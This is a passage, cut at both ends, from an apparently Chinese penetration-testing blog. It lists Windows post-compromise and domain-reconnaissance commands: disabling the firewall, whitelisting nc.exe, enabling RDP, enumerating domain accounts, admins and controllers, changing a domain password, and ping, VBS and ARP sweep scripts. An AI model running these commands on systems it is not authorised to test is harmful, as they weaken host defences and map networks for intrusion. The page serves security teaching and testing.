class="line">route printarp -a</span><br></pre></td></tr></table></figure><h3 id="25-防火墙相关"><a href="#25-防火墙相关" class="headerlink" title="25.防火墙相关"></a>25.防火墙相关</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall set opmode disable    #server 2003之前版本关闭防火墙netsh advfirewall set allprofiles state off #server 2003之后版本关闭防火墙netsh firewall show config    #查看防火墙配置netsh firewall add allowedprogram c:\nc.exe &quot;allow nc&quot; enable    #server 2003之前版本允许指定程序连接netsh advfirewall firewall add rule name=&quot;pass nc&quot; dir=in action=allow program=&quot;c:\nc.exe&quot;    #server 2003之后允许指定程序进入netsh advfirewall firewall add rule name=&quot;allow nc&quot; dir=out action=allow program=&quot;c:\nc.exe&quot;    #server 2003之后允许指定程序出去netsh advfirewall firewall add rule name=&quot;RPC&quot; protocol=TCP dir=in localport=3389 action=allow #放行3389netsh advfirewall set currentprofile logging filename &quot;c:\windows\temp\fw.log&quot;    #自定义防火墙日志文件位置</span><br></pre></td></tr></table></figure><h3 id="26-查看代理配置情况"><a href="#26-查看代理配置情况" class="headerlink" title="26.查看代理配置情况"></a>26.查看代理配置情况</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;</span><br></pre></td></tr></table></figure><h3 id="27-查询并开启远程连接服务"><a href="#27-查询并开启远程连接服务" class="headerlink" title="27.查询并开启远程连接服务"></a>27.查询并开启远程连接服务</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /V PortNumber    #查看远程连接端口(RDP) 3389端口十六进制为0xd3d</span><br><span class="line">wmic path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call setallowtsconnections 1    #server 2003版本以下开启3389</span><br><span class="line">wmic path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call setallowtsconnections 0    #server 2003版本以下关闭3389</span><br><span class="line">wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call setallowtsconnections 1    #server 2003版本以上开启3389(win7可以)</span><br><span class="line">wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call setallowtsconnections 0    #server 2003版本以上关闭3389</span><br><span class="line">wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName=&#x27;RDP-Tcp&#x27;) call setuserauthenticationrequired 1    #server 2008/2012版本开启3389(win7不可以)</span><br><span class="line">reg add &quot;HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER&quot; /v fSingleSessionPerUser /t REG_DWORD /d 0 /f    #server 2008/2012版本开启3389</span><br></pre></td></tr></table></figure><h2 id="0x02-域内信息收集"><a href="#0x02-域内信息收集" class="headerlink" title="0x02.域内信息收集"></a>0x02.域内信息收集</h2><h3 id="01-查看域用户信息"><a href="#01-查看域用户信息" class="headerlink" title="01.查看域用户信息"></a>01.查看域用户信息</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net user /domain    #显示所在域的用户名单</span><br><span class="line">net user 域用户 /domain    #获取域用户的详细信息</span><br><span class="line">net user /domain xxx 123456    #修改域用户密码，需要管理员权限</span><br></pre></td></tr></table></figure><h3 id="02-查询域信任列表"><a href="#02-查询域信任列表" class="headerlink" title="02.查询域信任列表"></a>02.查询域信任列表</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nltest /domain_trusts /all_trusts /v</span><br></pre></td></tr></table></figure><h3 id="03-返回域控与其对应的IP"><a href="#03-返回域控与其对应的IP" class="headerlink" title="03.返回域控与其对应的IP"></a>03.返回域控与其对应的IP</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nltest /dsgetdc:jiye</span><br><span class="line">nslookup -type=SRV _ldap._tcp    #查看域控主机名</span><br><span class="line">netdom query pdc    #查询域控</span><br></pre></td></tr></table></figure><h3 id="04-域用户组相关查询"><a href="#04-域用户组相关查询" class="headerlink" title="04.域用户组相关查询"></a>04.域用户组相关查询</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;domain admins&quot; /domain    #查看域管理员列表net group &quot;domain controllers&quot; /domain    #查看域控制器(如果有多台)net group &quot;domain computers&quot; /domain    #查看域机器net group &quot;domain users&quot; /domain    #查看域全部用户net group /domain    #查看域里工作组net localgroup administrators    #查看本机管理员[通常含有域用户]net localgroup administrators /domain    #登入本机的域管理员net localgroup administrators workgroup\user /add    #域用户添加到本机</span><br></pre></td></tr></table></figure><h2 id="04-获取域内用户和管理员信息-域控"><a href="#04-获取域内用户和管理员信息-域控" class="headerlink" title="04.获取域内用户和管理员信息(域控)"></a>04.获取域内用户和管理员信息(域控)</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic useraccount get /all    #获取域内用户的详细信息dsquery user        #查看存在用户dsquery computer    #查询目录中的计算机dsquery contact        #查询目录中的联系人dsquery subnet        #查询目录中的子网dsquery group        #查询目录中的组dsquery ou            #查询目录中的组织单位dsquery site        #查询目录中的站点dsquery server        #查询目录中的AD DC/LDS实例dsquery user        #查询目录中的用户dsquery quota        #查询目录中的配额规定dsquery partition    #查询目录中的分区dsquery * -            #用通用的LDAP查询目录中的任何对象</span><br></pre></td></tr></table></figure><h3 id="05-域主机相关查询"><a href="#05-域主机相关查询" class="headerlink" title="05.域主机相关查询"></a>05.域主机相关查询</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view    #查看同一域内机器列表net view \\IP    #查看某IP共享net view \\DC    #查看DC计算机的共享资源列表net view /domain    #查看内网存在多少个域net view /domain:jiye    #查看jiye域中的机器列表</span><br></pre></td></tr></table></figure><h3 id="06-查看域用户密码过期等信息"><a href="#06-查看域用户密码过期等信息" class="headerlink" title="06.查看域用户密码过期等信息"></a>06.查看域用户密码过期等信息</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net accounts /domain</span><br></pre></td></tr></table></figure><h3 id="07-判断域是否存在"><a href="#07-判断域是否存在" class="headerlink" title="07.判断域是否存在"></a>07.判断域是否存在</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /allsysteminfonet config workstation    #当前登入域</span><br></pre></td></tr></table></figure><h3 id="08-判断主域"><a href="#08-判断主域" class="headerlink" title="08.判断主域"></a>08.判断主域</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net time /domain执行以上命令通常有三种情况：1.存在域，但当前用户不是域用户，会出现拒绝访问结果2.存在域，但当前用户是域用户，得到正常输出3.当前环境为工作组，不存在域，会出现找不到域控信息</span><br></pre></td></tr></table></figure><h3 id="09-利用NetBios-网络邻居-探测内网"><a href="#09-利用NetBios-网络邻居-探测内网" class="headerlink" title="09.利用NetBios(网络邻居)探测内网"></a>09.利用NetBios(网络邻居)探测内网</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nbtscan.exe是一个命令行工具，可以扫描开放NetBios名称服务器nbtscan-1.0.35.exe 10.10.10.0/2410.10.10.10     JIYE\DC                         SHARING DC10.10.10.20     JIYE\WIN7DC1                    SHARING*timeout (normal end of scan)</span><br></pre></td></tr></table></figure><h3 id="10-ICMP协议快速探测内网"><a href="#10-ICMP协议快速探测内网" class="headerlink" title="10.ICMP协议快速探测内网"></a>10.ICMP协议快速探测内网</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /L %I in (1,1,254) DO @ping -w 1 -n 1 10.10.10.%I | findstr &quot;TTL&quot;</span><br></pre></td></tr></table></figure><p><code>vbs脚本探测</code></p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">strSubNet = <span class="string">&quot;10.10.10.&quot;</span> </span><br><span class="line"><span class="keyword">Set</span> objFSO= <span class="built_in">CreateObject</span>(<span class="string">&quot;Scripting.FileSystemObject&quot;</span>) </span><br><span class="line"><span class="keyword">Set</span> objTS = objfso.CreateTextFile(<span class="string">&quot;C:\Windows\Temp\Result.txt&quot;</span>)  </span><br><span class="line"><span class="keyword">For</span> i = <span class="number">1</span> <span class="keyword">To</span> <span class="number">254</span> </span><br><span class="line">strComputer = strSubNet &amp; i </span><br><span class="line">blnResult = Ping(strComputer) </span><br><span class="line"><span class="keyword">If</span> blnResult = <span class="literal">True</span> <span class="keyword">Then</span> </span><br><span class="line">objTS.WriteLine strComputer &amp; <span class="string">&quot; is alive ! :) &quot;</span> </span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"> <span class="keyword">Next</span>  </span><br><span class="line"> </span><br><span class="line">objTS.Close </span><br><span class="line">WScript.Echo <span class="string">&quot; All Ping scan, All Done!) &quot;</span>   </span><br><span class="line"><span class="keyword">Function</span> Ping(strComputer) </span><br><span class="line"><span class="keyword">Set</span> objWMIService = <span class="built_in">GetObject</span>(<span class="string">&quot;winmgmts:\\.\root\cimv2&quot;</span>) </span><br><span class="line"><span class="keyword">Set</span> colItems = objWMIService.ExecQuery(<span class="string">&quot;Select * From Win32_PingStatus Where Address=&#x27;&quot;</span> &amp; strComputer &amp; <span class="string">&quot;&#x27;&quot;</span>) </span><br><span class="line"><span class="keyword">For</span> <span class="keyword">Each</span> objItem <span class="keyword">In</span> colItems </span><br><span class="line"><span class="keyword">Select</span> <span class="keyword">case</span> objItem.StatusCode </span><br><span class="line"><span class="keyword">Case</span> <span class="number">0</span> </span><br><span class="line">Ping = <span class="literal">True</span> </span><br><span class="line"><span class="keyword">Case</span> <span class="keyword">Else</span> </span><br><span class="line">Ping = <span class="literal">False</span> </span><br><span class="line"><span class="keyword">End</span> <span class="keyword">select</span> </span><br><span class="line"><span class="keyword">Exit</span> <span class="keyword">For</span> </span><br><span class="line"><span class="keyword">Next</span> </span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span> </span><br><span class="line"></span><br><span class="line">#cscript <span class="number">1.</span>vps 执行</span><br></pre></td></tr></table></figure><h3 id="11-ARP扫描探测内网"><a href="#11-ARP扫描探测内网" class="headerlink" title="11.ARP扫描探测内网"></a>11.ARP扫描探测内网</h3><h4 id="01-arp-scan扫描工具"><a href="#01-arp-scan扫描工具" class="headerlink" title="01.arp-scan扫描工具"></a>01.arp-scan扫描工具</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan.exe -t 10.10.10.0/24</span><br></pre></td></tr></table></figure><h4 id="02-Empire中的arpscan模块"><a href="#02-Empire中的arpscan模块" class="headerlink" title="02.Empire中的arpscan模块"></a>02.Empire中的arpscan模块</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usemodule powershell/situational_awareness/network/arpscan</span><br></pre></td></tr></table></figure><h4 id="03-Nishang中的Invoke-ARPScan-ps1"><a href="#03-Nishang中的Invoke-ARPScan-ps1" class="headerlink" title="03.Nishang中的Invoke-ARPScan.ps1"></a>03.Nishang中的Invoke-ARPScan.ps1</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -exec bypass -Command &quot;&amp; &#123;Import-Module C:\Users\Administrator\Desktop\Invoke-ARPScan.ps1; Invoke-ARPScan -CIDR 10.10.10.0/24&#125;&quot; &gt;&gt; C:\Users\Administrator\Desktop\Result.txt</span><br></pre></td></tr></table></figure><p><code>Invoke-ARPScan.ps1如下</code></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Invoke-ARPScan</span></span> &#123;</span><br><span class="line"><span class="comment">&lt;#</span></span><br><span class="line"><span class="comment"><span class="doctag">.Synopsis</span></span></span><br><span class="line"><span class="comment">   Performs an ARP scan against a given range of IPv4 IP Addresses.</span></span><br><span class="line"><span class="comment">   Part of Posh-SecMod (https://github.com/darkoperator/Posh-SecMod/)</span></span><br><span class="line"><span class="comment">   Author: darkoperator</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"><span class="doctag">.DESCRIPTION</span></span></span><br><span class="line"><span class="comment">   Performs an ARP scan against a given range of IPv4 IP Addresses.</span></span><br><span class="line"><span class="comment"><span class="doctag">.EXAMPLE</span></span></span><br><span class="line"><span class="comment">   Invoke an ARP Scan against a range of IPs specified in CIDR Format</span></span><br><span class="line"><span class="comment">    PS C:\&gt; Invoke-ARPScan -CIDR 172.20.10.1/24</span></span><br><span class="line"><span class="comment">    MAC                                                       Address                                                  </span></span><br><span class="line"><span class="comment">    ---                                                       -------                                                  </span></span><br><span class="line"><span class="comment">    14:10:9F:D5:1A:BF                                         172.20.10.2                                              </span></span><br><span class="line"><span class="comment">    00:0C:29:93:10:B5                                         172.20.10.3                                              </span></span><br><span class="line"><span class="comment">    00:0C:29:93:10:B5                                         172.20.10.15  </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"><span class="doctag">.LINK</span></span></span><br><span class="line"><span class="comment">https://github.com/darkoperator/Posh-SecMod/blob/master/Discovery/Discovery.psm1</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">#&gt;</span></span><br><span class="line">    <span class="keyword">param</span> (</span><br><span class="line">        [<span class="type">Parameter</span>(<span class="type">Mandatory</span>=<span class="variable">$true</span>,</span><br><span class="line">                   <span class="type">ParameterSetName</span> = <span class="string">&quot;Range&quot;</span>,</span><br><span class="line">                   <span class="type">ValueFromPipelineByPropertyName</span>=<span class="variable">$true</span>,</span><br><span class="line">                   <span class="type">Position</span>=<span class="number">0</span>)]</span><br><span class="line">        [<span class="built_in">string</span>]<span class="variable">$Range</span>,</span><br><span class="line"></span><br><span class="line">        [<span class="type">Parameter</span>(<span class="type">Mandatory</span>=<span class="variable">$true</span>,</span><br><span class="line">                   <span class="type">ParameterSetName</span> = <span class="string">&quot;CIDR&quot;</span>,</span><br><span class="line">                   <span class="type">ValueFromPipelineByPropertyName</span>=<span class="variable">$true</span>,</span><br><span class="line">                   <span class="type">Position</span>=<span class="number">0</span>)]</span><br><span class="line">        [<span class="built_in">string</span>]<span class="variable">$CIDR</span>,</span><br><span class="line"></span><br><span class="line">        [<span class="type">Parameter</span>(<span class="type">Mandatory</span>=<span class="variable">$false</span>,</span><br><span class="line">                   <span class="type">ValueFromPipelineByPropertyName</span>=<span class="variable">$true</span>,</span><br><span class="line">                   <span class="type">Position</span>=<span class="number">0</span>)]</span><br><span class="line">        [<span class="built_in">string</span>]<span class="variable">$MaxThreads</span>=<span class="number">50</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">Begin</span> </span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">New-IPv4Range</span></span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">&lt;#</span></span><br><span class="line"><span class="comment">            <span class="doctag">.Synopsis</span></span></span><br><span class="line"><span class="comment">                Generates a list of IPv4 IP Addresses given a Start and End IP.</span></span><br><span class="line"><span class="comment">            <span class="doctag">.DESCRIPTION</span></span></span><br><span class="line"><span class="comment">                Generates a list of IPv4 IP Addresses given a Start and End IP.</span></span><br><span class="line"><span class="comment">            #&gt;</span></span><br><span class="line">            <span class="keyword">param</span>(</span><br><span class="line">                [<span class="type">Parameter</span>(<span class="type">Mandatory</span>=<span class="variable">$true</span>,</span><br><span class="line">                           <span class="type">ValueFromPipelineByPropertyName</span>=<span class="variable">$true</span>,</span><br><span class="line">                           <span class="type">Position</span>=<span class="number">0</span>)]</span><br><span class="line">                           <span class="variable">$StartIP</span>,</span><br><span class="line">                           </span><br><span class="line">                [<span class="type">Parameter</span>(<span class="type">Mandatory</span>=<span class="variable">$true</span>,</span><br><span class="line">                           <span class="type">ValueFromPipelineByPropertyName</span>=<span class="variable">$true</span>,</span><br><span class="line">                           <span class="type">Position</span>=<span class="number">2</span>)]</span><br><span class="line">                           <span class="variable">$EndIP</span>          </span><br><span class="line">            )</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># created by Dr. Tobias Weltner, MVP PowerShell</span></span><br><span class="line">            <span class="variable">$ip1</span> = ([<span class="type">System.Net.IPAddress</span>]<span class="variable">$StartIP</span>).GetAddressBytes()</span><br><span class="line">            [<span class="built_in">Array</span>]::Reverse(<span class="variable">$ip1</span>)</span><br><span class="line">            <span class="variable">$ip1</span> = ([<span class="type">System.Net.IPAddress</span>](<span class="variable">$ip1</span> <span class="operator">-join</span> <span class="string">&#x27;.&#x27;</span>)).Address</span><br><span class="line"></span><br><span class="line">            <span class="variable">$ip2</span> = ([<span class="type">System.Net.IPAddress</span>]<span class="variable">$EndIP</span>).GetAddressBytes()</span><br><span class="line">            [<span class="built_in">Array</span>]::Reverse(<span class="variable">$ip2</span>)</span><br><span class="line">            <span class="variable">$ip2</span> = ([<span class="type">System.Net.IPAddress</span>](<span class="variable">$ip2</span> <span class="operator">-join</span> <span class="string">&#x27;.&#x27;</span>)).Address</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="variable">$x</span>=<span class="variable">$ip1</span>; <span class="variable">$x</span> <span class="operator">-le</span> <span class="variable">$ip2</span>; <span class="variable">$x</span>++) &#123;</span><br><span class="line">                <span class="variable">$ip</span> = ([<span class="type">System.Net.IPAddress</span>]<span class="variable">$x</span>).GetAddressBytes()</span><br><span class="line">                [<span class="built_in">Array</span>]::Reverse(<span class="variable">$ip</span>)</span><br><span class="line">                <span class="variable">$ip</span> <span class="operator">-join</span> <span class="string">&#x27;.&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">New-IPv4RangeFromCIDR</span> </span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">&lt;#</span></span><br><span class="line"><span class="comment">            <span class="doctag">.Synopsis</span></span></span><br><span class="line"><span class="comment">                Generates a list of IPv4 IP Addresses given a CIDR.</span></span><br><span class="line"><span class="comment">            <span class="doctag">.DESCRIPTION</span></span></span><br><span class="line"><span class="comment">                Generates a list of IPv4 IP Addresses given a CIDR.</span></span><br><span class="line"><span class="comment">            #&gt;</span></span><br><span class="line">            <span class="keyword">param</span>(</span><br><span class="line">                [<span class="type">Parameter</span>(<span class="type">Mandatory</span>=<span class="variable">$true</span>,</span><br><span class="line">                           <span class="type">ValueFromPipelineByPropertyName</span>=<span class="variable">$true</span>,</span><br><span class="line">                           <span class="type">Position</span>=<span class="number">0</span>)]</span><br><span class="line">                           <span class="variable">$Network</span></span><br><span class="line">            )</span><br><span class="line">            <span class="comment"># Extract the portions of the CIDR that will be needed</span></span><br><span class="line">            <span class="variable">$StrNetworkAddress</span> = (<span class="variable">$Network</span>.split(<span class="string">&quot;/&quot;</span>))[<span class="number">0</span>]</span><br><span class="line">            [<span class="built_in">int</span>]<span class="variable">$NetworkLength</span> = (<span class="variable">$Network</span>.split(<span class="string">&quot;/&quot;</span>))[<span class="number">1</span>]</span><br><span class="line">            <span class="variable">$NetworkIP</span> = ([<span class="type">System.Net.IPAddress</span>]<span class="variable">$StrNetworkAddress</span>).GetAddressBytes()</span><br><span class="line">            <span class="variable">$IPLength</span> = <span class="number">32</span>-<span class="variable">$NetworkLength</span></span><br><span class="line">            [<span class="built_in">Array</span>]::Reverse(<span class="variable">$NetworkIP</span>)</span><br><span class="line">            <span class="variable">$NumberOfIPs</span> = ([<span class="type">System.Math</span>]::Pow(<span class="number">2</span>, <span class="variable">$IPLength</span>)) <span class="literal">-1</span></span><br><span class="line">            <span class="variable">$NetworkIP</span> = ([<span class="type">System.Net.IPAddress</span>](<span class="variable">$NetworkIP</span> <span class="operator">-join</span> <span class="string">&quot;.&quot;</span>)).Address</span><br><span class="line">            <span class="variable">$StartIP</span> = <span class="variable">$NetworkIP</span> +<span class="number">1</span></span><br><span class="line">            <span class="variable">$EndIP</span> = <span class="variable">$NetworkIP</span> + <span class="variable">$NumberOfIPs</span></span><br><span class="line">            <span class="comment"># We make sure they are of type Double before conversion</span></span><br><span class="line">            <span class="keyword">If</span> (<span class="variable">$EndIP</span> <span class="operator">-isnot</span> [<span class="built_in">double</span>])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$EndIP</span> = <span class="variable">$EndIP</span> <span class="operator">-as</span> [<span class="built_in">double</span>]</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">If</span> (<span class="variable">$StartIP</span> <span class="operator">-isnot</span> [<span class="built_in">double</span>])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$StartIP</span> = <span class="variable">$StartIP</span> <span class="operator">-as</span> [<span class="built_in">double</span>]</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment"># We turn the start IP and end IP in to strings so they can be used.</span></span><br><span class="line">            <span class="variable">$StartIP</span> = ([<span class="type">System.Net.IPAddress</span>]<span class="variable">$StartIP</span>).IPAddressToString</span><br><span class="line">            <span class="variable">$EndIP</span> = ([<span class="type">System.Net.IPAddress</span>]<span class="variable">$EndIP</span>).IPAddressToString</span><br><span class="line">            <span class="built_in">New-IPv4Range</span> <span class="variable">$StartIP</span> <span class="variable">$EndIP</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$sign</span> = <span class="string">@&quot;</span></span><br><span class="line"><span class="string">using System;</span></span><br><span class="line"><span class="string">using System.Collections.Generic;</span></span><br><span class="line"><span class="string">using System.Text;</span></span><br><span class="line"><span class="string">using System.Net;</span></span><br><span class="line"><span class="string">using System.Net.NetworkInformation;</span></span><br><span class="line"><span class="string">using System.Runtime.InteropServices;</span></span><br><span class="line"><span class="string">public static class NetUtils</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    [System.Runtime.InteropServices.DllImport(&quot;iphlpapi.dll&quot;, 